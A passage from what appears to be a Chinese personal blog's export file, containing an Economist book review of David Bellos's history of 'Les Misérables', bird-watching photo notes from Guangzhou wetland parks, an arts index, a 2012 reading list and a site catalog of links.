<p>从人道地对待罪犯，再到关怀流浪儿童，《悲惨世界》带头呼吁改革，促成了“未来社会的进步”。一些书真的改变了世界。这一次，它早就打破了舞台上的票房纪录。在音乐剧中，雨果的英雄在吟诵：一首电视选秀节目选手喜爱的——“带他回家”。Bellos先生的工作毋宁说，他将“悲惨世界”从制造者和他的时代完整重现。</p>
<h2 id="Economist"><a href="#Economist" class="headerlink" title="Economist:"></a>Economist:</h2><p>By the book How Victor Hugo came to write “Les Misérables”, his magnum opus</p>
<p>The extraordinary story of a book that changed the world</p>
<p>The Novel of the Century: The Extraordinary Adventure of Les Misérables. By David Bellos. Particular Books; 307 pages; £20. To be published in America by Farrar, Straus &amp; Giroux in March; $27.</p>
<p>“AS LONG as there are ignorance and poverty on Earth,” wrote Victor Hugo in his preface to “Les Misérables”, “books such as this one may not be useless.” Over the 155 years since it was first published in France and then elsewhere, the novel has never lost its relevance—or its popularity.</p>
<p>Around 65 film versions (the first in 1909) make “Les Misérables” the most frequently adapted novel of all time. The first stage musical opened in Philadelphia in January 1863. Since 1980 Alain Boublil and Claude-Michel Schönberg’s operatic melodrama has been performed more than 53,000 times in 44 countries and 349 cities. Yet, from the outset, adapters and translators cherry-picked elements from their supersized source. British admirers had to wait until 2008 for a complete English text of the novel in the order in which the author had planned it to be read. Even to lovers of “Les Mis”, Hugo’s world-shaking blockbuster can feel like a lost continent.</p>
<p>David Bellos, an English-born professor of French literature at Princeton University and an eminent translator, navigates through its five parts, 48 “books” and 365 chapters with clarity and wit. At once erudite and entertaining, he shows how the novel’s magic lies in its multitasking versatility. Hugo’s extraordinary feat is to deliver “an intricately realistic portrait” of France after Napoleon, “a dramatic page-turner” packed with suspense—and a demonstration of “generous moral principles” that readers still find appealing today.</p>
<p>Hugo, already the author of “Notre-Dame de Paris” and a literary superstar as a poet, playwright and novelist, began in 1845 to write his story of a former convict seeking a new life in a society rigged against the poor and outcast. Around the questing figure of Jean Valjean, freed from the prison-hulks in 1815 to make his way against the steepest odds, Hugo stitched a vast but “very tightly knit” tapestry of social strife and personal rebirth.</p>
<p>The revolution of 1848, in which the radical firebrand discovered that “his head was with order” although his heart “was with the poor”, interrupted Hugo’s mammoth project. It resumed after the exiled writer, banished by the upstart emperor, Napoleon III, settled on the Channel Island of Guernsey: no longer a “brilliant careerist” but a “stand-alone protester”.</p>
<p>Curiously, this “tiny feudal outpost of the British crown” hosted the gestation and birth of a book that won hearts and changed minds across the world. The editing and printing of the precious manuscript depended on the schedules of Queen Victoria’s Royal Mail and the Guernsey steamer timetables. In 1861 “the biggest deal in book history” saw Hugo paid the equivalent of 20 years of a bishop’s stipend: enough “to build a small railway”. By late 1862, the year of publication, Charles Wilbour’s English translation was reported to be “the largest order ever placed for a book in America”.</p>
<p>Save for Hugo’s literary rivals (Alexandre Dumas likened it to “wading through mud”), everybody loved the long haul of Valjean’s rehabilitation in the company of characters who soon entered folklore: the street-girl Fantine, her daughter Cosette, the urchin Gavroche, the student Marius. Shorn of its condemnation of slavery, the novel even circulated in a pirate edition among Confederate soldiers during the American civil war. In a weary pun on their commander’s name, they dubbed themselves “Lee’s Miserables”.</p>
<p>From the humane treatment of ex-offenders to the care of street children, “Les Misérables” spearheaded calls for reform and contributed to “the future improvement of society”. Few books really change the world. This one did, long before it broke box-office records on stage. In the musical Hugo’s hero intones—in a song loved by television talent-show contestants—“Bring Him Home”. Mr Bellos does just that, as he restores “Les Mis” to its maker and his times.</p>
<p>This article appeared in the Books and arts section of the print edition under the headline “By the book”<br><img src="http://riboseyim-qiniu.riboseyim.com/LesMiserables_theme_musical.png" alt=""></p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/Artistic-Classical/">古典音乐低俗史</a></li>
<li><a href="https://riboseyim.github.io/2017/04/20/Artistic-The-Mad-Phoenix/">舞台剧：南海十三郎</a></li>
<li><a href="https://riboseyim.github.io/2016/09/10/Lincoln/">电影评论|灵魂解码《林肯》</a></li>
<li><a href="https://riboseyim.github.io/2017/05/13/Lincoln-Spielberg/">电影评论|斯皮尔伯格的林肯情怀</a></li>
<li><a href="https://riboseyim.github.io/2017/10/18/Artistic-Poetry/">风月集|诗三百，思无邪</a></li>
<li><a href="https://riboseyim.github.io/2017/04/13/Artistic-Les-Miserables/">世纪小说《悲惨世界》</a></li>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/">红楼故事：佩刀沽酒作长歌</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/">红楼故事：康熙的秘密情报系统</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/Artistic-Garden/">江南园林鉴赏|南京瞻园</a></li>
<li><a href="https://riboseyim.github.io/2016/10/15/Artistic-Zhuhai-AirShow/">摄影专辑|珠海航空航天展览</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>1、<a href="[https://www.youtube.com/watch?v=tI4jb-Aca9M]"> Youtube :Bring Him Home </a><br>2、<a href="https://www.amazon.com/Novel-Century-Extraordinary-Adventure-Mis%C3%A9rables/dp/0374223238]"> Amazon: The Novel of the Century: The Extraordinary Adventure of Les Misérables</a><br>3、<a href="https://en.wikipedia.org/wiki/David_Bellos">Wiki David Bellos </a></p>
]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>Artistic</tag>
        <tag>Books</tag>
      </tags>
  </entry>
  <entry>
    <title>湿地公园</title>
    <url>/2017/07/02/BirdWatching-GZ-Wetland/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>广州华南植物园</li>
<li>广州南沙湿地公园</li>
<li>广州海珠湿地公园</li>
</ul>
<a id="more"></a>
<h4 id="广州华南植物园"><a href="#广州华南植物园" class="headerlink" title="广州华南植物园"></a>广州华南植物园</h4><p>时间：20171014 14:00 ~ 18:00<br>器材：SONY ILCE-6000L<br>镜头：55-210mm F/4.5-6.3</p>
<p>效果不佳</p>
<h4 id="广州南沙湿地公园"><a href="#广州南沙湿地公园" class="headerlink" title="广州南沙湿地公园"></a>广州南沙湿地公园</h4><p>时间：20170923 15:00 ~ 19:00<br>器材：SONY ILCE-6000L<br>镜头：55-210mm F/4.5-6.3</p>
<p><strong>good：</strong></p>
<ul>
<li>云台</li>
<li>望远镜</li>
<li>红外遥控器</li>
</ul>
<p><strong>不足：</strong></p>
<ul>
<li>时间点：10月份大部分是留鸟·白鹭，候鸟集中季节为春节前夕</li>
<li>交通不便</li>
<li>园内无照明</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/IMG_3508.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01738.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01589.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01591.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01708.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01750.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01758.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01785.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01795.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01667.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01670.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01763.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01765.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01812.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01560.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01564.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01568.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01571.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01697.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01572.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01597.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01600.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01601.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01638.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01663.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01617.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01620.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01622.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01711.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01808.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/IMG_3502.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/IMG_3504.png" alt></p>
<h4 id="广州海珠湿地公园"><a href="#广州海珠湿地公园" class="headerlink" title="广州海珠湿地公园"></a>广州海珠湿地公园</h4><p>时间：20170701 13:00 ~ 16:00<br>器材：SONY ILCE-6000L<br>镜头：55-210mm F/4.5-6.3</p>
<p><strong>good：</strong></p>
<ul>
<li>挡雨盖（很重要）</li>
</ul>
<p><strong>bad:</strong></p>
<ul>
<li>未携带望远镜</li>
<li>未携带雨具</li>
<li>鞋子不挡水</li>
<li>上衣非速干</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01502.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01510.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01465.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01466.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01469.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01471.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01473.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01474.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01475.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01477.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01478.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01479.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01480.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01482.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01486.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01491.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01494.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01508.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01524.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01527.JPG" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DSC01532.JPG" alt></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://photo.poco.cn/special_topic/topic_id-6889-p-1.html#content_hash" target="_blank" rel="noopener">初秋打鸟秘笈 教你如何拍出完美飞鸟</a></li>
</ul>
]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>摄影</tag>
        <tag>Travel</tag>
      </tags>
  </entry>
  <entry>
    <title>香山艺术评论 | Overview of Artistic</title>
    <url>/2016/05/02/Artistic/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="诗歌"><a href="#诗歌" class="headerlink" title="诗歌"></a>诗歌</h2><ul>
<li><a href="https://riboseyim.github.io/2017/10/18/Artistic-Poetry/" target="_blank" rel="noopener">风月集|诗三百，思无邪</a></li>
</ul>
<h2 id="古典音乐"><a href="#古典音乐" class="headerlink" title="古典音乐"></a>古典音乐</h2><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/Artistic-Classical/" target="_blank" rel="noopener">古典音乐低俗史</a></li>
</ul>
<h2 id="电影"><a href="#电影" class="headerlink" title="电影"></a><a href="#">电影</a></h2><ul>
<li><a href="https://riboseyim.github.io/2016/09/10/Lincoln/" target="_blank" rel="noopener">电影评论|灵魂解码《林肯》</a></li>
<li><a href="https://riboseyim.github.io/2017/05/13/Lincoln-Spielberg/" target="_blank" rel="noopener">电影评论|斯皮尔伯格的林肯情怀</a></li>
</ul>
<h2 id="舞台剧"><a href="#舞台剧" class="headerlink" title="舞台剧"></a><a href="#">舞台剧</a></h2><ul>
<li><a href="https://riboseyim.github.io/2017/04/20/Artistic-The-Mad-Phoenix/" target="_blank" rel="noopener">舞台剧：南海十三郎</a></li>
</ul>
<h2 id="小说"><a href="#小说" class="headerlink" title="小说"></a>小说</h2><ul>
<li><a href="https://riboseyim.github.io/2017/04/13/Artistic-Les-Miserables/" target="_blank" rel="noopener">世纪小说《悲惨世界》</a><h4 id="红学"><a href="#红学" class="headerlink" title="红学 "></a><a href="https://riboseyim.github.io/2017/08/28/Redology/" target="_blank" rel="noopener">红学 </a></h4></li>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/" target="_blank" rel="noopener">红楼故事：佩刀沽酒作长歌</a></li>
</ul>
<h2 id="摄影"><a href="#摄影" class="headerlink" title="摄影"></a><a href="#">摄影</a></h2><ul>
<li><a href="https://riboseyim.github.io/2017/07/02/BirdWatching-GZ-Wetland/" target="_blank" rel="noopener">旅行指南|湿地公园</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/Artistic-Garden/" target="_blank" rel="noopener">旅行指南|江南园林</a></li>
<li><a href="https://riboseyim.github.io/2016/10/15/Artistic-Zhuhai-AirShow/" target="_blank" rel="noopener">旅行指南|珠海航空航天展览</a></li>
</ul>
<h2 id="篆刻"><a href="#篆刻" class="headerlink" title="篆刻"></a><a href="#">篆刻</a></h2><p>文士好石，精雕细刻，温润如玉；<br>将军用铜，刀劈斧凿，雄强刚猛。<br>— 2016-08-11</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E5%8D%B0%E7%AB%A0_20170901.png" alt></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NzQwNjcyMQ==&amp;mid=401695916&amp;idx=1&amp;sn=4a10c7356090b17711c50f4ef21205b5&amp;scene=1&amp;srcid=1221pcEFyXFOnAXiQbXTFK8h#rd" target="_blank" rel="noopener">韩高宗 黄章晋:女特务的中国进化史</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjMyNjQ3NQ==&amp;mid=2650368106&amp;idx=1&amp;sn=5b65ddef1b12bd034f0e8181c3467c23&amp;scene=1&amp;srcid=0726Q0mWhChMvzIugd2y05fO#rd" target="_blank" rel="noopener">韦芈:镀金上海 (京剧史)</a></li>
</ul>
]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
      </tags>
  </entry>
  <entry>
    <title>我的2012年度盘点</title>
    <url>/2017/04/28/Check2012/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>我的2012年阅读书单</li>
</ul>
<span id="more"></span>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/01/Check2018/">2018:年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/10/Check2017/">2017:年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/01/01/Check2016/">2016:年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/28/Check2012/">2012:阅读书单</a></li>
</ul>
<h2 id="我的2012年阅读书单"><a href="#我的2012年阅读书单" class="headerlink" title="我的2012年阅读书单"></a>我的2012年阅读书单</h2><blockquote>
<p>不忘初心</p>
</blockquote>
<p>最近有读者在微信公众号后台留言，希望我能推荐些对自己影响较大的书籍（不限于人生思想、专业技术等方面）。<br>说实话这个问题还真是很难回答，毕竟我自己都还没活明白呢！焦虑满满、困惑比所知多得多，更何况各人背景不同，<br>前路不同，我所知所能也未必就比别人高明，草率推荐就有好为人师、误人子弟的嫌疑了。</p>
<p>恰好在整理过去的文档资料的时候，发现一份2012年读书笔记，记录了那些年读过的一些东西。<br>以现在的眼光来看，当时的探索最大的意义在于重新构建了历史观。特别是超脱天朝教育体制第一次从世界史的角度认识世界。</p>
<blockquote>
<p>大家感兴趣的还是国内史，尤其是古代史中帝王将相的权谋。几年前在一个图书公司的招待会上，我亲耳听到一位作者断言：“历史写作的核心是权谋！”其实真说起来，很多热衷写历史权谋的人，自己不在权力系统里，一生少有操弄权术的机会，多是村夫野老三两杯薄酒后指点江山的悠谬之谈。远如《三国演义》里诸葛亮派将领打仗前要给几个妙计锦囊，近如《甄嬛传》在路上放个鹅卵石让敌人流产，都属于二手权谋家关起门来的臆想，谁信谁倒霉。————《读史很容易变成谄媚式的揣摩，或者遗老式的缅怀》</p>
</blockquote>
<p>总的来说这些阅读的主题非常凌乱，内容良莠不齐，个人的阅读体验也深浅不一，大部分只做到通读而已。<br>人是非常复杂的，很难说会因为读几本书就有根本改变。我们所能做的，无非保持持续阅读、保持持续探索之心，在探索中不断修正航向。</p>
<!--more-->
<h2 id="一、历史和社会科学"><a href="#一、历史和社会科学" class="headerlink" title="一、历史和社会科学"></a>一、历史和社会科学</h2><h3 id="中国史"><a href="#中国史" class="headerlink" title="中国史"></a>中国史</h3><ol>
<li>通读《史记》￼ </li>
<li>秦史: 小说/电影《大秦帝国》、纪录片《复活的军团》</li>
<li>通读《汉书》 ￼ </li>
<li>通读《资治通鉴》 ￼ </li>
<li>魏晋南北朝：李鸿宾、阎步克系列讲座</li>
<li>明史：《明朝那些事儿》（全套）</li>
<li>明史：《血酬定律》</li>
<li>明史：《明季北略》（未深入）</li>
<li>《透过钱眼看中国历史》 </li>
</ol>
<h3 id="宗教专题"><a href="#宗教专题" class="headerlink" title="宗教专题"></a>宗教专题</h3><p>世界各主要宗教发展简史</p>
<h3 id="世界史"><a href="#世界史" class="headerlink" title="世界史"></a>世界史</h3><ol>
<li>世界通史 </li>
<li>英国通史  《Mr Bean》、《英伦见闻录》</li>
<li>德国通史￼</li>
<li>法国通史 ￼  </li>
<li>俄国通史 ￼  [美]沃尔特-G-莫斯《俄国史》</li>
<li>美国通史 </li>
<li>比尔德《美国文明的兴起》</li>
<li>罗荣渠《美国历史通论》</li>
<li>日本通史</li>
<li>《东亚三国志》</li>
<li>北欧通史 </li>
<li>荷兰通史 </li>
<li>《Golden Age—Bontekoe in Asia》（17世纪班德固船长航海日志）</li>
<li>《大国海盗》</li>
<li>《东亚海域一千年》</li>
<li>语言：法语 （进展甚微）</li>
</ol>
<h3 id="公民伦理"><a href="#公民伦理" class="headerlink" title="公民伦理"></a>公民伦理</h3><ol>
<li>《美国独立宣言The Declaration of Independence》</li>
<li>托克维尔：《旧制度与大革命》、</li>
<li>《论美国的民主》￼（上卷）</li>
<li>卢梭：《忏悔录》（les confessions）￼第三章</li>
<li>富兰克林：《富兰克林自传》￼ </li>
<li>庞勒《大众心理研究》</li>
</ol>
<h3 id="野记杂文"><a href="#野记杂文" class="headerlink" title="野记杂文"></a>野记杂文</h3><ol>
<li>《阅微草堂笔记》</li>
<li>《容斋笔记》</li>
<li>《中国巫术史》</li>
<li>《丑陋的中国人》￼ </li>
<li>《摩托日记》</li>
<li>《格萨尔王》</li>
<li>《藏地密码》</li>
<li>《房龙地理》</li>
<li>《林则徐西域记》（未深入）</li>
<li>《海国图志》（缺）</li>
</ol>
<h2 id="二、艺术鉴赏"><a href="#二、艺术鉴赏" class="headerlink" title="二、艺术鉴赏"></a>二、艺术鉴赏</h2><ol>
<li>《欧洲文化起源研究》</li>
<li>马赛曲</li>
<li>扬基都德</li>
<li>舞台剧￼《南海十三郎》</li>
<li>粤剧《昭君出塞》</li>
<li>粤剧《子建会洛神》</li>
<li>粤语相声：黄俊英</li>
<li>篆刻《中国印史》</li>
</ol>
<h2 id="三、工程技术-amp-科学"><a href="#三、工程技术-amp-科学" class="headerlink" title="三、工程技术&amp;科学"></a>三、工程技术&amp;科学</h2><ol>
<li>无线电￼ 进展甚微</li>
<li>孙思邈 《千金方》（序）</li>
<li>《中国人的身体和疾病—医学修辞和叙事》</li>
<li>[美]迈克尔-赫-斯通《剖析恶魔》(精神病学分析)</li>
<li>《躁狂抑郁多俊才》</li>
<li>《精子战争》</li>
<li>《微生物与人类》</li>
</ol>
<h2 id="四、商业"><a href="#四、商业" class="headerlink" title="四、商业"></a>四、商业</h2><ol>
<li>《史记-货殖列传》</li>
<li>《汉书-食货志》</li>
<li>吴晓波《大败局》</li>
<li>莫妮卡-兰利《花旗帝国》</li>
<li>《簿记论》</li>
<li>《哥德堡号中国之旅》</li>
<li>邓九刚《茶叶之路》(中俄)</li>
<li>Ben Simpfendorfef《新丝绸之路》、</li>
<li>《香料传奇Spice:The History of a Temptation》</li>
<li>《集装箱改变世界》</li>
<li>《移民法：出入境权研究》</li>
<li>《粤海关志》(未深入)</li>
<li>《近代中国的走私与海关》</li>
</ol>
<blockquote>
<p>2017-04-27 整理更新</p>
</blockquote>
<h2 id="分类-我的自传"><a href="#分类-我的自传" class="headerlink" title="分类:我的自传"></a><a href="https://riboseyim.github.io/2016/06/03/Autobiography/">分类:我的自传</a></h2><p><a href="https://riboseyim.github.io/2017/04/28/Check2012/">source:https://riboseyim.github.io/2017/04/28/Check2012/</a></p>
]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title>RiboseYim&#39;s Blog Root Catalog</title>
    <url>/2017/05/26/Catalog/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>一、Autobiography | 我的自传</li>
<li>二、过程改进 &amp; 方法论</li>
<li>三、Information Technology</li>
</ul>
<span id="more"></span>
<h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><table>
   <tr>
      <td>项目</td>
      <td>一级</td>
      <td>二级</td>
      <td>三级</td>
      <td>四级</td>
      <td>应用</td>
   </tr>
   <tr>
      <td rowspan="4">科学</td>
   </tr>
   <tr>
      <td><a href="https://riboseyim.com/2017/06/14/Mathmetics/" target="\_blank">数学</a></td>
      <td></td>  
      <td><a href="https://riboseyim.github.io/2019/01/09/Data-Science/" target="\_blank">数据科学</td>
      <td></td>
      <td><a href="https://riboseyim.com/2017/07/06/Visualization/" target="\_blank">数据可视化</a></td>
   </tr>
   <tr>
      <td><a href="" target="\_blank">物理</a></td>
      <td></td>  
      <td></td>
      <td></td>
      <td></td>
   </tr>
   <tr>
      <td><a href="" target="\_blank">生物</a></td>
            <td><a href="https://riboseyim.github.io/2017/08/15/Medicine/" target="\_blank">医学</a></td>   
      <td></td>
      <td></td>
      <td></td>
   </tr>

   <tr>
      <td rowspan="4"><a href="https://riboseyim.github.io/2019/01/07/Engineering/" target="\_blank">工程</a></td>
   </tr>
   <tr>
      <td><a href="https://riboseyim.github.io/2018/12/31/Engineering-Architecture/" target="\_blank">建筑</a></td>
      <td></td>
      <td></td>  
      <td><a href="https://riboseyim.com//2019/03/27/Project-Construction/" target="\_blank">建筑工程项目管理</a></td>
      <td></td>
   </tr>
   <tr>
      <td><a href="" target="\_blank">通信</a></td>
      <td></td>  
      <td><a href="https://riboseyim.github.io/2017/05/26/Protocol/" target="\_blank">协议</a></td>
      <td></td>
      <td></td>
   </tr>
   <tr>
      <td><a href="" target="\_blank">计算机</a></td>
      <td><a href="https://riboseyim.github.io/2017/05/26/Language/" target="\_blank">编程语言</a></td>  
      <td><a href="https://riboseyim.com/2016/05/28/Linux/" target="\_blank">操作系统Linux</a>  </td>
      <td> <a href="https://riboseyim.com/2016/10/07/CyberSecurity/" target="\_blank">网络安全</a> <a href="https://riboseyim.com/2017/07/23/CloudComputing/" target="\_blank">云计算</a> </td>
      <td><a href="https://riboseyim.github.io/2019/04/06/Project-PMIS/" target="\_blank">项目管理信息系统</a></td>
   </tr>
   <tr>
      <td rowspan="4"><a href="https://riboseyim.github.io/2017/07/02/Manager/" target="\_blank">管理</a></td>
   </tr>
   <tr>
      <td><a href="" target="\_blank">会计</a></td>
      <td></td>  
      <td></td>
      <td></td>
      <td></td>
   </tr>
   <tr>
      <td><a href="https://riboseyim.github.io/2017/07/02/Manager/" target="\_blank">管理</a></td>
      <td></td>  
      <td><a href="https://riboseyim.com/2019/02/06/Project/" target="\_blank">项目管理</a></a></td>
      <td></td>
      <td><a href="https://riboseyim.com/2019/04/30/Project-PMP" target="\_blank">PMP</a></td>
   </tr>
   <tr>
      <td><a href="https://riboseyim.github.io/2016/04/26/Economist/" target="\_blank">经济</a></td>
      <td></td>  
      <td></td>
      <td></td>
      <td></td>
   </tr>
   <tr>
      <td rowspan="4">公共</td>
   </tr>
   <tr>
      <td><a href="https://riboseyim.github.io/2016/04/26/Commander/" target="\_blank">军事</a></td>
      <td><a href="https://riboseyim.github.io/2016/04/26/Commander/" target="\_blank">指挥</a></td>  
      <td></td>
      <td></td>
      <td></td>
   </tr>
   <tr>
      <td><a href="https://riboseyim.github.io/2016/04/26/Law/" target="\_blank">法律</a></td>
      <td></td>  
      <td></td>
      <td></td>
      <td></td>
   </tr>
   <tr>
      <td><a href="" target="\_blank">政策</a></td>
      <td></td>  
      <td><a href="https://riboseyim.github.io/2016/04/26/Policy/" target="\_blank">公共政策</a></td>
      <td></td>
      <td><a href="https://riboseyim.github.io/2016/09/10/Lincoln/" target="\_blank">林肯研究</a></td>
   </tr>
   <tr>
      <td rowspan="5">文化</td>
   </tr>
   <tr>
      <td><a href="" target="\_blank">社会</a></td>
      <td><a href="https://riboseyim.github.io/2018/02/01/International-Relations/" target="\_blank">国际关系</a></td>  
      <td></td>
      <td></td>
      <td></td>
   </tr>
   <tr>
      <td><a href="" target="\_blank">心理</a></td>
      <td><a href="https://riboseyim.github.io/2019/02/04/Intelligence/" target="\_blank">情报/智能</a></td>  
      <td><a href="https://riboseyim.com/tags/Writing/" target="\_blank">写作</a></td>
      <td></td>
      <td><a href="https://riboseyim.com/2017/02/09/eBook/" target="\_blank">电子书</a></td>
   </tr>
   <tr>
      <td><a href="https://riboseyim.github.io/2016/05/01/History/" target="\_blank">历史</a></td>
      <td></td>  
      <td><a href="https://riboseyim.github.io/2017/06/24/History-Qing/" target="\_blank">清史</a></td>
      <td></td>
      <td></td>
   </tr>
   <tr>
      <td><a href="https://riboseyim.github.io/2016/05/02/Artistic/" target="\_blank">艺术</a></td>
      <td></td>  
      <td><a href="https://riboseyim.github.io/2016/05/02/Artistic/" target="\_blank">艺术评论</a></td>
      <td></td>
      <td></td>
   </tr>

</table>



<h2 id="待解决问题"><a href="#待解决问题" class="headerlink" title="待解决问题"></a>待解决问题</h2><ul>
<li>Automatic update directory</li>
</ul>
<h2 id="一、Autobiography-我的自传"><a href="#一、Autobiography-我的自传" class="headerlink" title="一、Autobiography | 我的自传"></a>一、<a href="https://riboseyim.github.io/2016/06/23/Autobiography/">Autobiography | 我的自传</a></h2><ul>
<li><a href="https://riboseyim.github.io/2018/12/31/Check2019/">我的 2019 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2018/01/01/Check2018/">我的 2018 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/10/Check2017/">我的 2017 年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/01/01/Check2016/">我的 2016 年度盘点</a></li>
<li><p><a href="https://riboseyim.github.io/2017/04/28/Check2012/">我的 2012 阅读书单</a></p>
</li>
<li><p><a href="https://riboseyim.github.io/2016/05/31/AboutMe/">About RiboseYim</a></p>
</li>
</ul>
<h2 id="二、过程改进-amp-方法论"><a href="#二、过程改进-amp-方法论" class="headerlink" title="二、过程改进 &amp; 方法论"></a>二、过程改进 &amp; 方法论</h2><ul>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
<li><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/">嗑药简史：关于瘾品，成瘾机制及其历史</a></li>
<li><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></li>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">DevOps 漫谈：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">DevOps 漫谈：Kanban看板管理实践精要</a></li>
<li><a href="https://riboseyim.github.io/2016/06/11/Writing/">最佳写作实践：从Evernote到Ulysses</a></li>
<li><a href="https://riboseyim.github.io/2017/06/03/Writing-WriterToolChain/">我的写作工具链</a></li>
<li><a href="https://riboseyim.github.io/2017/02/09/eBook/">我的电子书列表</a></li>
